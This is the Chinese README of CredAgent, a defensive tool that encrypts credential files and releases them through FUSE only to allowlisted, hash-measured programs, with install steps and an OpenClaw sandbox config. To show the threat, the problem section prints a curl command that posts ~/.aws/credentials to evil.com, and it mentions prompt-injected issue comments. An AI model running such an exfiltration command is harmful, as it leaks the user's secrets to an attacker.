<p align="center">
  <strong>CredAgent</strong><br>
  只有被授权的程序才能打开凭据文件——<br>
  哪怕 AI agent 已经拿到了一个 shell。
</p>

<p align="center">
  <a href="https://github.com/aliyun/credagent/actions/workflows/ci.yml"><img src="https://github.com/aliyun/credagent/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <a href="https://github.com/aliyun/credagent/releases/latest"><img src="https://img.shields.io/github/v/release/aliyun/credagent" alt="Release"></a>
  <img src="https://img.shields.io/badge/platform-linux%20%7C%20macos-blue" alt="Platform">
  <img src="https://img.shields.io/badge/Go-1.25-00ADD8?logo=go" alt="Go">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-green" alt="License"></a>
</p>

<p align="center">
  <a href="README.md">English</a> | <b>简体中文</b>
</p>

---

## 问题

AI agent 通过shell调用`ssh` `git`等工具，就必须具有访问凭据文件的权限，这构成了泄露隐患：

```bash
cat ~/.ssh/id_rsa                              # 成功
curl -X POST -d @~/.aws/credentials evil.com   # 成功
```

文件权限帮不了你：agent 是**以你的身份**运行的。密钥管理服务也帮不了——Vault、SSM 之流要求应用改造成调用 API，而 `ssh`、`git`、`psql`、`kubectl`、`aliyun` 并不会修改。

一条被提示注入的 issue 评论，就足以把你的 agent 变成数据外泄工具。

## CredAgent 做了什么

CredAgent 把原始凭据文件内容静态加密，再通过 FUSE 挂载**在原路径**把它送回去，应用无需任何改动。原始文件变成一个符号链接；明文从不落盘。

是否解密取决于**是哪个进程在请求**，而不是源进程有什么身份和权限。进程调用 `open()` 时，CredAgent 在释放一个字节之前先对调用方做度量和证明：

| 检查项 | 阻止什么 |
|---|---|
| **二进制白名单**（`--program-permit`） | 任何你没有显式授权的程序 |
| **SHA256 度量**（`--measure`） | 被木马化的 `/usr/bin/ssh` 或被篡改的脚本 |
| **属主 uid/gid + 文件 mode** | 权限混淆与跨用户读取 |
| **打开次数限制**（`--open-frequency`） | 循环批量收割凭据 |
| **eBPF / auditd cmdline 证明** | 解释器在运行时改写 `/proc/<pid>/cmdline` 以冒充授权脚本 |
| **Security 安全性检查** | 检查各类攻击手段 |

被拒绝的进程只会看到一个普通的 `EACCES`。被授权的进程则完全察觉不到发生过什么。

```bash
$ credctl protect --strategy BASIC --program-permit /usr/bin/ssh \
      --measure true --open-frequency 2 ~/.ssh/id_rsa

$ ls -l ~/.ssh/id_rsa
lrw------- 1 user user 40 Apr 8 11:06 .ssh/id_rsa -> /mnt/credagent/shielded/59524298d125

$ cat ~/.ssh/id_rsa
cat: /home/user/.ssh/id_rsa: Permission denied     # 你不是 /usr/bin/ssh

$ git push origin main                             # ssh 已授权——正常工作
```

<!-- TODO: 把上面的命令记录替换成 15 秒的 asciinema/VHS 录屏。
     一段展示 拒绝/允许 行为的真实终端 GIF 是这个页面价值最高的补充。 -->

## 快速开始

每个 [release](https://github.com/aliyun/credagent/releases) 都附带预编译的**静态二进制**，无需 Go 工具链。

**1. 下载**

```bash
VERSION=0.2.0
curl -LO "https://github.com/aliyun/credagent/releases/download/v${VERSION}/credagent_${VERSION}_linux_amd64.tar.gz"
tar xzf "credagent_${VERSION}_linux_amd64.tar.gz" && cd "credagent_${VERSION}_linux_amd64"
```

macOS 请改用 `credagent_${VERSION}_darwin_universal.tar.gz`。

**2. 安装** —— 同一个 `INSTALL` 脚本同时处理 Linux（systemd）与 macOS（launchd）：

```bash
sudo ./INSTALL
```

**3. 初始化**（首次启动前必须做一次）：

```bash
sudo credagent init --config /usr/local/etc/credagent/engine/config.json
```

> 无人值守 / 云镜像部署：在服务的 `ExecStart` 上加 `--auto-init`，首次启动时自动生成 master key 和一个随机 admin 密码。

**4. 启动**

```bash
sudo systemctl start credagent && sudo systemctl enable credagent          # Linux
sudo launchctl load /Library/LaunchDaemons/com.credagent.enclave.plist     # macOS
```

**5. 保护一个凭据**

```bash
credctl protect --strategy BASIC --program-permit /usr/bin/ssh \
    --measure true --open-frequency 2 ~/.ssh/id_rsa
```

`sudo ./INSTALL --rollback` 可在出问题时回滚到备份。

## 环境要求

| | |
|---|---|
| **Linux** | 内核带 FUSE。eBPF cmdline 证明需要 >= 5.2 且带 BTF；否则降级到 `auditd`，再否则用普通 `/proc` |
| **macOS** | [macFUSE](https://osxfuse.github.io/)（需要重启）。无 eBPF，故 cmdline 防篡改检测不可用 |

```bash
sudo apt install fuse                      # Debian / Ubuntu——提供 fusermount；无需 libfuse 头文件
brew install --cask macfuse                # macOS
echo "user_allow_other" | sudo tee -a /etc/fuse.conf
```

## 文档

- [命令参考 —— `credagent` / `credctl`](Docs/manual_zh.md)
- [English documentation](README.md)
- 在 agent 沙箱中保护凭据 —— 见下方 [保护 OpenClaw skill 的凭据文件](#保护openclaw-skill的凭据文件) 一节

## 从源码构建

```bash
git clone https://github.com/aliyun/credagent && cd credagent

# Linux——纯 Go，静态链接，无需 libfuse 头文件
CGO_ENABLED=0 go build -o credagent ./cmd/credagent
CGO_ENABLED=0 go build -o credctl   ./cmd/credctl

sudo ./INSTALL
```

macOS 构建需要 cgo（`libproc`/`sysctl` 进程证明层），且必须**在 macOS 上**构建：

```bash
go build -o credagent ./cmd/credagent      # CGO_ENABLED=1 默认开启
```

eBPF 字节码已预生成并提交，`go build` 直接包含 eBPF 支持，无需额外步骤。修改 `internal/execsnoop/bpf/execsnoop.c` 后，用 `go generate ./internal/execsnoop/` 重新生成（需要 `clang` 和 `libbpf-dev`）。

## 工作原理

三个组件：

- **`credagent`** —— root 守护进程。持有 AES-256-GCM 加密的凭据库，挂载 FUSE 文件系统，并在每次 `open()` 上运行策略引擎。
- **`credctl`** —— 管理 CLI。保护/释放文件，管理程序白名单和 SHA256 度量，无需解除保护即可导出/恢复凭据内容。

凭据存在 bbolt 存储中，由 `master.key` 加密。FUSE 层把每次 `open()` 解析到调用方 PID，遍历 `/proc`（Linux）或 `libproc`/`sysctl`（macOS）获取进程上下文，并在解密前评估策略。

## 威胁模型

CredAgent 保护的是**凭据文件**。它不保护被授权程序自身环境。如果被授权脚本位于一个全局可写目录，攻击者可以在不碰脚本本身的情况下影子化它的 import。

macOS 上没有 eBPF，因此运行时改写自身 `cmdline` 的进程可以绕过语义检查。在该平台上，建议对稳定的系统二进制使用 `--measure true`。

## 贡献

欢迎 issue 和 pull request。干净 checkout 后运行：

```bash
CGO_ENABLED=0 go build ./...
go vet ./...
go test ./... -count=1 -skip 'RealAI'
```

名为 `*RealAI` 的测试会调用真实 LLM 端点。它们在 CI 中被排除；除非你在 `internal/agent/config.test.json` 里配了可用的端点，否则直接 `go test ./...` 会在这些用例上失败——该文件不提交，`loadTestConfig` 会回退到一个仍会尝试网络调用的占位配置。除非你专门在改 LLM 风险评估路径，否则用 `-skip 'RealAI'`。

## 许可证

Apache License 2.0 —— 见 [LICENSE](LICENSE)。

## 保护OpenClaw skill的凭据文件

### 保护 host 执行环境中的凭据文件
OpenClaw 会直接使用 exec 工具在 host 环境中调用程序，这种情况无需任何差异性操作。

### 保护 sandbox 执行环境中的凭据文件
1. 配置 openclaw.json 中的 sandbox 配置，把 host 中 FUSE 挂载点，挂载到 sandbox 同名位置：
```json
// openclaw.json 中 sandbox 增加配置：
"sandbox": {
        "mode": "non-main",
        "workspaceAccess": "none",
        "scope": "session",
        "docker": {
          "image": "openclaw-sandbox:bookworm-slim",
          "containerPrefix": "openclaw-sbx-",
          "network": "bridge",
          "binds": [
            "/mnt/credagent/shielded/:/mnt/credagent/shielded/:slave"   // 映射 FUSE 文件系统同名挂载点
          ],
          "dangerouslyAllowExternalBindSources": true   // 允许外部映射，否则 binds 中映射会被安全策略拒绝
        },
        "prune": {
          "idleHours": 2,
          "maxAgeDays": 7
        }
      }
```
> 这样操作，可使沙箱中的符号链接指向 /mnt/credagent/shielded/xxxxxx 时有效，并能被 host 上的 credagent 响应。对于 runc 沙箱，credagent 可以在 host 上看到 sandbox 中的访问进程，并获取到进程上下文，也能度量到访问程序和脚本。
